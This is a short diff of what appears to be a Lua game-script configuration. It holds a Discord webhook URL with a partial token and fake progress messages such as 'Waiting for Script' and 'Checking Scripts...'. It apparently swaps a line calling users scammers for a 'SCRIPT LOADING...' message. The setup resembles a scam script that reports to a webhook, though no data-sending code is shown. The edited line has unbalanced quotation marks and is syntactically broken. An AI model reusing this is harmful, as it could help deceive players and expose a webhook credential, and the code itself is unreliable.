@@ -4,8 +4,7 @@ WebHook = "https://discord.com/api/webhooks/1084271031704895538/JuGr4ImoxdCNMErT
 
 _G.CustomScriptName = "HELLO GUESTS"
 
-_G.Text1 = "Script PROSTI TEBYA SCAMHULI"
-
+_G.Text1 = "Скрипт "SCRIPT LOADING..."
 _G.Text2 = "Waiting for Script"
 
 _G.Text3 = "Checking Scripts..."
